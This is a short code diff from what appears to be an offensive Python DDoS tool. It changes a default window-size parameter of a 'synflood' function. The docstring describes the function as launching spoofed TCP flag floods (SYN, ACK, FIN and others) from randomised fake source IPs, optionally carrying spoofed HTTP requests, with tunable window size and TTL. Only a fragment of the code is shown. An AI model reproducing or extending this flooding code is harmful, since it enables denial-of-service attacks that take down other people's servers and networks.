@@ -1759,7 +1759,7 @@ class sflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def synflood(u,p=80,max_window=5840,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window=-1,payloads=True,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
+def synflood(u,p=80,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window=-1,payloads=True,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
